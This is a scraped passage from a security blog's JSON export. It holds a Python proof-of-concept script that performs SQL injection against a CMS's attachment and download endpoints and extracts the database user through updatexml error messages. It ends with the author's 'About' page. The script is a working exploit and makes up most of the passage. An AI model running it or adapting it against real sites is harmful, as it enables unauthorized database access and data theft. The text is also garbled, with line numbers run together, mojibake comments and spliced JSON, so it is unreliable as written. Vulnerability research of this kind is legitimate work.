Poc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-# @Time : 2018-12-20 23:24# @Author : Patrilic# @FileName: sql_poc.py# @Software: PyCharmimport requestsimport reimport sysdef poc(url): try: step1 = url + \"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\" response = requests.get(step1) post = &#123; \"userid_flash\":response.cookies[\"okuga_siteid\"] &#125; print(\"[+] Get Cookie : \" + response.cookies[\"okuga_siteid\"]) # Ëé∑ÂèñcookieÔºåÈÅøÂÖçÁôªÈôÜÂ§±Êïà step2 = url + \"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26\" response = requests.post(step2, post) # print(response.cookies) sqli_payload = response.cookies['okuga_att_json'] print(\"[+] Get Sqli_poc : \" + sqli_payload) # Ëé∑ÂèñÂä†ÂØÜ payload step3 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload response = requests.get(step3) # print(response.text) user = re.findall(r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;', response.text) # Ê≥®ÂÖ• try: user[0] print(\"[+] Congraduations! This url is Vulnerable! \") except: print(\"[-] Not vulnerable!\") except: passdef main(): url = sys.argv[1] poc(url)if __name__ == '__main__': main()","categories":[],"tags":[{"name":"‰ª£Á†ÅÂÆ°ËÆ°","slug":"‰ª£Á†ÅÂÆ°ËÆ°","permalink":"http://patrilic.top/tags/‰ª£Á†ÅÂÆ°ËÆ°/"}]},{"title":"About","slug":"Hello","date":"2019-04-01T03:20:33.000Z","updated":"2019-07-08T15:53:55.250Z","comments":true,"path":"2019/04/01/Hello/","link":"","permalink":"http://patrilic.top/2019/04/01/Hello/","excerpt":"","text":"Welcome To My Blog~A Security Lover ‚ù§Ô∏èRed-Team &amp;&amp;Web SecurityFrom CUIT D0g3 &amp;&amp; MS08067Love: @Kea Github: https://github.com/patrilic/Email: patrilic@outlook.com","categories":[],"tags":[]}]}